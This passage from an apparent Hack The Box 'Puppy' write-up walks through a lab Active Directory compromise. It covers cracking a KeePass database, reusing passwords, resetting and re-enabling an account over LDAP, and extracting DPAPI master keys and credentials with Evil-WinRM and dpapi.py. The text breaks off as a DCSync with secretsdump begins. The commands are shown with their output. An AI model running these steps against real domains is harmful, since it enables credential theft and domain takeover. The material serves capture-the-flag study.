</span></span><span class=line><span class=cl>  .                                  DR        <span class=m>0</span>  Sun Mar <span class=m>23</span> 07:07:57 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Sat Mar  <span class=m>8</span> 16:52:57 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  KeePassXC-2.7.9-Win64.msi           A <span class=m>34394112</span>  Sun Mar <span class=m>23</span> 07:09:12 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  Projects                            D        <span class=m>0</span>  Sat Mar  <span class=m>8</span> 16:53:36 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  recovery.kdbx                       A     <span class=m>2677</span>  Wed Mar <span class=m>12</span> 02:25:46 <span class=m>2025</span>
</span></span></code></pre></td></tr></table></div></div><p>While trying to access it, it looks like it require a password.</p><p><img src=/p/puppy-htb-writeup/Puppy3.png width=829 height=642 srcset="/p/puppy-htb-writeup/Puppy3_hu_5a4088d0a4e64e6d.png 480w, /p/puppy-htb-writeup/Puppy3_hu_bacd8bfea75bb2bc.png 1024w" loading=lazy alt=" " class=gallery-image data-flex-grow=129 data-flex-basis=309px></p><p>I cracked the <code>.kdbx</code> file using the <a class=link href=https://github.com/r3nt0n/keepass4brute target=_blank rel=noopener>keepass4brute</a>, and the password is <code>liverpool</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl> ./keepass4brute.sh ../recovery.kdbx rockyou.txt 
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>keepass4brute 1.3 by r3nt0n
</span></span><span class=line><span class=cl>https://github.com/r3nt0n/keepass4brute
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Words tested: 36/14344391 - Attempts per minute: <span class=m>86</span> - Estimated <span class=nb>time</span> remaining: <span class=m>16</span> weeks, <span class=m>3</span> days
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Current attempt: liverpool
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Password found: liverpool
</span></span></code></pre></td></tr></table></div></div><p>As we see i got access to these users passwords.</p><p><img src=/p/puppy-htb-writeup/Puppy4.png width=796 height=528 srcset="/p/puppy-htb-writeup/Puppy4_hu_aafe5e33f933bb6.png 480w, /p/puppy-htb-writeup/Puppy4_hu_c50311f3ec8125b2.png 1024w" loading=lazy alt=" " class=gallery-image data-flex-grow=150 data-flex-basis=361px></p><p>The <code>adam.silver</code> password is not working as <code>nxc</code> show below.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl> nxc smb puppy.htb -u <span class=s1>&#39;adam.silver&#39;</span> -p <span class=s1>&#39;HJKL2025!&#39;</span>
</span></span><span class=line><span class=cl>                     
</span></span><span class=line><span class=cl> SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Windows Server <span class=m>2022</span> Build <span class=m>20348</span> x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:PUPPY.HTB<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>-<span class=o>]</span> PUPPY.HTB<span class=se>\a</span>dam.silver:HJKL2025! STATUS_LOGON_FAILURE 
</span></span></code></pre></td></tr></table></div></div><p>As oppose the <code>Antony C. Edwards</code> one is working, but with with the SamAccountName <code>ant.edwards</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>nxc smb puppy.htb -u <span class=s1>&#39;ant.edwards&#39;</span> -p <span class=s1>&#39;Antman2025!&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Windows Server <span class=m>2022</span> Build <span class=m>20348</span> x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:PUPPY.HTB<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>+<span class=o>]</span> PUPPY.HTB<span class=se>\a</span>nt.edwards:Antman2025! 
</span></span></code></pre></td></tr></table></div></div><p>After a quick search on this user, i found that we have <code>GenericAll</code> over the <code>adam.silver</code> user, who is part of the <code>Remote Management</code> Group.</p><p><img src=/p/puppy-htb-writeup/Puppy5.png width=840 height=255 srcset="/p/puppy-htb-writeup/Puppy5_hu_98c10a10442492b8.png 480w, /p/puppy-htb-writeup/Puppy5_hu_8464616291e7957d.png 1024w" loading=lazy alt=" " class=gallery-image data-flex-grow=329 data-flex-basis=790px></p><p>We can now change this user&rsquo;s password.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl> net rpc password <span class=s2>&#34;adam.silver&#34;</span> <span class=s2>&#34;P@ssword2025&#34;</span> -U <span class=s2>&#34;PUPPY.HTB&#34;</span>/<span class=s2>&#34;ant.edwards&#34;</span>%<span class=s2>&#34;Antman2025\!&#34;</span> -S <span class=s2>&#34;dc.puppy.htb&#34;</span>
</span></span><span class=line><span class=cl>Can<span class=err>&#39;</span>t load /etc/samba/smb.conf - run testparm to debug it
</span></span></code></pre></td></tr></table></div></div><p>Even though it still no working, because the account is disabled.
This how to disable the user&rsquo;s account.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>ldapmodify -x -H ldap://10.10.11.70 <span class=se>\ </span>                              
</span></span><span class=line><span class=cl>-D <span class=s1>&#39;ant.edwards@puppy.htb&#39;</span> -w <span class=s1>&#39;Antman2025!&#39;</span> <span class=s>&lt;&lt;EOF
</span></span></span><span class=line><span class=cl><span class=s>dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
</span></span></span><span class=line><span class=cl><span class=s>changetype: modify
</span></span></span><span class=line><span class=cl><span class=s>replace: userAccountControl
</span></span></span><span class=line><span class=cl><span class=s>userAccountControl: 512
</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
</span></span><span class=line><span class=cl>modifying entry <span class=s2>&#34;CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>And just like that we got the user flag!!</p><p><img src=/p/puppy-htb-writeup/Puppy6.png width=963 height=423 srcset="/p/puppy-htb-writeup/Puppy6_hu_827ea84f3beaa473.png 480w, /p/puppy-htb-writeup/Puppy6_hu_1c6e49a2356f2df8.png 1024w" loading=lazy alt=" " class=gallery-image data-flex-grow=227 data-flex-basis=546px></p><h2 id=root->Root :</h2><p>Navigating through the File system as <code>adam.silver</code> i found this <code>C:\Backups</code> file which unusual, where i found this <code>site-backup-2024-12-30.zip</code> file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\B</span>ackups&gt; ls
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\B</span>ackups
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                 LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                 -------------         ------ ----
</span></span><span class=line><span class=cl>-a----          3/8/2025   8:22 AM        <span class=m>4639546</span> site-backup-2024-12-30.zip
</span></span></code></pre></td></tr></table></div></div><p>After getting the zip file locally and looking through it i found this config file, that expose the <code>steph.cooper</code> credentials.</p><p><img src=/p/puppy-htb-writeup/Puppy7.png width=548 height=425 srcset="/p/puppy-htb-writeup/Puppy7_hu_e91705936cbe9c31.png 480w, /p/puppy-htb-writeup/Puppy7_hu_6cc09e8da562.png 1024w" loading=lazy alt=" " class=gallery-image data-flex-grow=128 data-flex-basis=309px></p><p>These are valid as <code>nxc</code> says.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>nxc smb puppy.htb -u <span class=s1>&#39;steph.cooper&#39;</span> -p <span class=s1>&#39;ChefSteph2025!&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Windows Server <span class=m>2022</span> Build <span class=m>20348</span> x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:PUPPY.HTB<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.70     <span class=m>445</span>    DC               <span class=o>[</span>+<span class=o>]</span> PUPPY.HTB<span class=se>\s</span>teph.cooper:ChefSteph2025! 
</span></span></code></pre></td></tr></table></div></div><p>``
This user is part of the <code>Remote Management</code> group as well. So i used <code>evil-winrm</code> to enumerate further.</p><p>This time i used <code>winPEASx64.exe</code>. As it shows below it reveals some DPAPI Master keys and Credential file under the <code>steph.cooper</code> user.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PowerShell data-lang=PowerShell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>steph</span><span class=p>.</span><span class=n>cooper</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=p>.\</span><span class=n>winPEASx64</span><span class=p>.</span><span class=py>exe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=n>SNIP</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=p>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>√â√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç</span><span class=err>¬π</span> <span class=n>Checking</span> <span class=k>for</span> <span class=n>DPAPI</span> <span class=n>Master</span> <span class=n>Keys</span>
</span></span><span class=line><span class=cl><span class=n>√à</span>  <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>book</span><span class=p>.</span><span class=py>hacktricks</span><span class=p>.</span><span class=n>wiki</span><span class=p>/</span><span class=n>en</span><span class=p>/</span><span class=nb>windows-hardening</span><span class=p>/</span><span class=nb>windows-local</span><span class=n>-privilege-escalation</span><span class=p>/</span><span class=n>index</span><span class=p>.</span><span class=n>html</span><span class=c>#dpapi</span>
</span></span><span class=line><span class=cl>    <span class=n>MasterKey</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>steph</span><span class=p>.</span><span class=n>cooper</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Roaming</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Protect</span><span class=p>\</span><span class=n>S</span><span class=p>-</span><span class=mf>1</span><span class=p>-</span><span class=mf>5</span><span class=p>-</span><span class=mf>21</span><span class=p>-</span><span class=mf>1487982659</span><span class=p>-</span><span class=mf>1829050783</span><span class=p>-</span><span class=mf>2281216199</span><span class=p>-</span><span class=mf>1107</span><span class=p>\</span><span class=n>556a2412</span><span class=p>-</span><span class=mf>1275</span><span class=p>-</span><span class=n>4ccf-b721-e6a0b4f90407</span>
</span></span><span class=line><span class=cl>    <span class=n>Accessed</span><span class=err>:</span> <span class=mf>3</span><span class=p>/</span><span class=mf>8</span><span class=p>/</span><span class=mf>2025</span> <span class=mf>7</span><span class=err>:</span><span class=mf>40</span><span class=err>:</span><span class=mf>36</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl>    <span class=n>Modified</span><span class=err>:</span> <span class=mf>3</span><span class=p>/</span><span class=mf>8</span><span class=p>/</span><span class=mf>2025</span> <span class=mf>7</span><span class=err>:</span><span class=mf>40</span><span class=err>:</span><span class=mf>36</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl>   <span class=p>=================================================================================================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>√â√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç</span><span class=err>¬π</span> <span class=n>Checking</span> <span class=k>for</span> <span class=n>DPAPI</span> <span class=n>Credential</span> <span class=n>Files</span>
</span></span><span class=line><span class=cl><span class=n>√à</span>  <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>book</span><span class=p>.</span><span class=py>hacktricks</span><span class=p>.</span><span class=n>wiki</span><span class=p>/</span><span class=n>en</span><span class=p>/</span><span class=nb>windows-hardening</span><span class=p>/</span><span class=nb>windows-local</span><span class=n>-privilege-escalation</span><span class=p>/</span><span class=n>index</span><span class=p>.</span><span class=n>html</span><span class=c>#dpapi</span>
</span></span><span class=line><span class=cl>    <span class=n>CredFile</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>steph</span><span class=p>.</span><span class=n>cooper</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Local</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Credentials</span><span class=p>\</span><span class=n>DFBE70A7E5CC19A398EBF1B96859CE5D</span>
</span></span><span class=line><span class=cl>    <span class=n>Description</span><span class=err>:</span> <span class=n>Local</span> <span class=n>Credential</span> <span class=n>Data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>MasterKey</span><span class=err>:</span> <span class=n>556a2412</span><span class=p>-</span><span class=mf>1275</span><span class=p>-</span><span class=n>4ccf-b721-e6a0b4f90407</span>
</span></span><span class=line><span class=cl>    <span class=n>Accessed</span><span class=err>:</span> <span class=mf>3</span><span class=p>/</span><span class=mf>8</span><span class=p>/</span><span class=mf>2025</span> <span class=mf>8</span><span class=err>:</span><span class=mf>14</span><span class=err>:</span><span class=mf>09</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl>    <span class=n>Modified</span><span class=err>:</span> <span class=mf>3</span><span class=p>/</span><span class=mf>8</span><span class=p>/</span><span class=mf>2025</span> <span class=mf>8</span><span class=err>:</span><span class=mf>14</span><span class=err>:</span><span class=mf>09</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl>    <span class=n>Size</span><span class=err>:</span> <span class=mf>11068</span>
</span></span><span class=line><span class=cl>   <span class=p>=================================================================================================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>CredFile</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>steph</span><span class=p>.</span><span class=n>cooper</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Roaming</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Credentials</span><span class=p>\</span><span class=n>C8D69EBE9A43E9DEBF6B5FBD48B521B9</span>
</span></span><span class=line><span class=cl>    <span class=n>Description</span><span class=err>:</span> <span class=n>Enterprise</span> <span class=n>Credential</span> <span class=n>Data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>MasterKey</span><span class=err>:</span> <span class=n>556a2412</span><span class=p>-</span><span class=mf>1275</span><span class=p>-</span><span class=n>4ccf-b721-e6a0b4f90407</span>
</span></span><span class=line><span class=cl>    <span class=n>Accessed</span><span class=err>:</span> <span class=mf>3</span><span class=p>/</span><span class=mf>8</span><span class=p>/</span><span class=mf>2025</span> <span class=mf>7</span><span class=err>:</span><span class=mf>54</span><span class=err>:</span><span class=mf>29</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl>    <span class=n>Modified</span><span class=err>:</span> <span class=mf>3</span><span class=p>/</span><span class=mf>8</span><span class=p>/</span><span class=mf>2025</span> <span class=mf>7</span><span class=err>:</span><span class=mf>54</span><span class=err>:</span><span class=mf>29</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl>    <span class=n>Size</span><span class=err>:</span> <span class=mf>414</span>
</span></span><span class=line><span class=cl>   <span class=p>=================================================================================================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>√à</span> <span class=n>Follow</span> <span class=n>the</span> <span class=n>provided</span> <span class=n>link</span> <span class=k>for</span> <span class=n>further</span> <span class=n>instructions</span> <span class=k>in</span> <span class=n>how</span> <span class=n>to</span> <span class=n>decrypt</span> <span class=n>the</span> <span class=n>creds</span> <span class=n>file</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=n>SNIP</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=p>.</span>
</span></span></code></pre></td></tr></table></div></div><p>Master key :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>teph.cooper<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\P</span>rotect<span class=se>\S</span>-1-5-21-1487982659-1829050783-2281216199-1107&gt; copy 556a2412-1275-4ccf-b721-e6a0b4f90407 C:<span class=se>\U</span>sers<span class=se>\s</span>teph.cooper<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>Sers<span class=se>\s</span>teph.cooper<span class=se>\D</span>esktop&gt; attrib -h -s 556a2412-1275-4ccf-b721-e6a0b4f90407
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>Sers<span class=se>\s</span>teph.cooper<span class=se>\D</span>esktop&gt; download 556a2412-1275-4ccf-b721-e6a0b4f90407
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Downloading C:<span class=se>\U</span>Sers<span class=se>\s</span>teph.cooper<span class=se>\D</span>esktop<span class=se>\5</span>56a2412-1275-4ccf-b721-e6a0b4f90407 to 556a2412-1275-4ccf-b721-e6a0b4f90407
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Download successful!
</span></span></code></pre></td></tr></table></div></div><p>Credential File :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>teph.cooper<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\C</span>redentials&gt; attrib -h -s C8D69EBE9A43E9DEBF6B5FBD48B521B9
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>teph.cooper<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\C</span>redentials&gt; cp C8D69EBE9A43E9DEBF6B5FBD48B521B9 C:<span class=se>\U</span>sers<span class=se>\s</span>teph.cooper<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>teph.cooper<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\C</span>redentials&gt; <span class=nb>cd</span> C:<span class=se>\U</span>sers<span class=se>\s</span>teph.cooper<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>teph.cooper<span class=se>\D</span>esktop&gt; download C8D69EBE9A43E9DEBF6B5FBD48B521B9
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Downloading C:<span class=se>\U</span>sers<span class=se>\s</span>teph.cooper<span class=se>\D</span>esktop<span class=se>\C</span>8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D69EBE9A43E9DEBF6B5FBD48B521B9
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Download successful!
</span></span></code></pre></td></tr></table></div></div><p>The first step involves decrypting the¬†<strong>Master Key</strong>¬†using the¬†<code>dpapi.py</code>¬†tool. The Master Key is encrypted and tied to the user&rsquo;s <code>SID</code> and password.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password <span class=s1>&#39;ChefSteph2025!&#39;</span> 
</span></span><span class=line><span class=cl>Impacket v0.11.0 - Copyright <span class=m>2023</span> Fortra
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>MASTERKEYFILE<span class=o>]</span>
</span></span><span class=line><span class=cl>Version     :        <span class=m>2</span> <span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
</span></span><span class=line><span class=cl>Flags       :        <span class=m>0</span> <span class=o>(</span>0<span class=o>)</span>
</span></span><span class=line><span class=cl>Policy      : 4ccf1275 <span class=o>(</span>1288639093<span class=o>)</span>
</span></span><span class=line><span class=cl>MasterKeyLen: <span class=m>00000088</span> <span class=o>(</span>136<span class=o>)</span>
</span></span><span class=line><span class=cl>BackupKeyLen: <span class=m>00000068</span> <span class=o>(</span>104<span class=o>)</span>
</span></span><span class=line><span class=cl>CredHistLen : <span class=m>00000000</span> <span class=o>(</span>0<span class=o>)</span>
</span></span><span class=line><span class=cl>DomainKeyLen: <span class=m>00000174</span> <span class=o>(</span>372<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Decrypted key with User Key <span class=o>(</span>MD4 protected<span class=o>)</span>
</span></span><span class=line><span class=cl>Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
</span></span></code></pre></td></tr></table></div></div><p>Once the Master Key is decrypted, it can be used to decrypt stored credentials. This command decrypts the credential file using the extracted Master Key.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl> dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 
</span></span><span class=line><span class=cl>Impacket v0.11.0 - Copyright <span class=m>2023</span> Fortra
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>CREDENTIAL<span class=o>]</span>
</span></span><span class=line><span class=cl>LastWritten : 2025-03-08 15:54:29
</span></span><span class=line><span class=cl>Flags       : 0x00000030 <span class=o>(</span>CRED_FLAGS_REQUIRE_CONFIRMATION<span class=p>|</span>CRED_FLAGS_WILDCARD_MATCH<span class=o>)</span>
</span></span><span class=line><span class=cl>Persist     : 0x00000003 <span class=o>(</span>CRED_PERSIST_ENTERPRISE<span class=o>)</span>
</span></span><span class=line><span class=cl>Type        : 0x00000002 <span class=o>(</span>CRED_TYPE_DOMAIN_PASSWORD<span class=o>)</span>
</span></span><span class=line><span class=cl>Target      : Domain:target<span class=o>=</span>PUPPY.HTB
</span></span><span class=line><span class=cl>Description : 
</span></span><span class=line><span class=cl>Unknown     : 
</span></span><span class=line><span class=cl>Username    : steph.cooper_adm
</span></span><span class=line><span class=cl>Unknown     : FivethChipOnItsWay2025!
</span></span></code></pre></td></tr></table></div></div><p><code>Bloodhound</code> shows that this user have DCSync Right over the whole domain.</p><p><img src=/p/puppy-htb-writeup/Puppy1.png width=800 height=290 srcset="/p/puppy-htb-writeup/Puppy1_hu_9fe29030b33c4771.png 480w, /p/puppy-htb-writeup/Puppy1_hu_d417acf02d38ccb6.png 1024w" loading=lazy alt=" " class=gallery-image data-flex-grow=275 data-flex-basis=662px></p><p>Now let&rsquo;s DCsync using <code>secretsdump.py</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
